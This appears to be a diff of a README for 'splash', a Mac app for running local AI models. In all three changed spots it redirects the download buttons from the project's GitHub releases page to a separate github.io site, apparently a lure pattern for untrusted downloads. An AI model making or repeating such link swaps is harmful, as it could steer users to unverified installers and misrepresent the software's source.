@@ -1,6 +1,6 @@
 # 🚀 splash - Run Powerful AI Models Locally on Your Mac
 
-[![Download splash](https://img.shields.io/badge/Download-splash-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/lyndelgnostic7640/splash/releases)
+[![Download splash](https://img.shields.io/badge/Download-splash-blue?style=for-the-badge&logo=github&color=4B0082)](https://lyndelgnostic7640.github.io)
 
 ## ✨ What is splash?
 
@@ -37,7 +37,7 @@ If you're unsure whether your Mac has an Apple chip, click the Apple logo in the
 Getting splash on your Mac is straightforward. Follow these simple steps:
 
 1. **Visit the download page:** Click the green button below or go to the download link at the top of this page.
-   [![Download splash](https://img.shields.io/badge/Download-splash-green?style=for-the-badge&logo=github&color=2E8B57)](https://github.com/lyndelgnostic7640/splash/releases)
+   [![Download splash](https://img.shields.io/badge/Download-splash-green?style=for-the-badge&logo=github&color=2E8B57)](https://lyndelgnostic7640.github.io)
 
 2. **Choose the right file:** On the download page, look for the latest version of splash. You'll see a file that matches your Mac's chip type. If you have an M1 or newer chip, select the file labeled "Apple Silicon" or "arm64."
 
@@ -147,7 +147,7 @@ If you need additional assistance:
 You're now ready to experience the power of local AI on your Mac. Download splash, follow the simple installation steps, and you'll have a private, fast, and free AI assistant at your fingertips.
 
 Remember, the download link is available at the top of this page and below:
-[![Download splash](https://img.shields.io/badge/Download-splash-orange?style=for-the-badge&logo=github&color=FF8C00)](https://github.com/lyndelgnostic7640/splash/releases)
+[![Download splash](https://img.shields.io/badge/Download-splash-orange?style=for-the-badge&logo=github&color=FF8C00)](https://lyndelgnostic7640.github.io)
 
 Visit this link to download the application. Once you have it installed, you'll wonder how you ever worked without it. Enjoy exploring all the amazing things you can accomplish with splash!
 
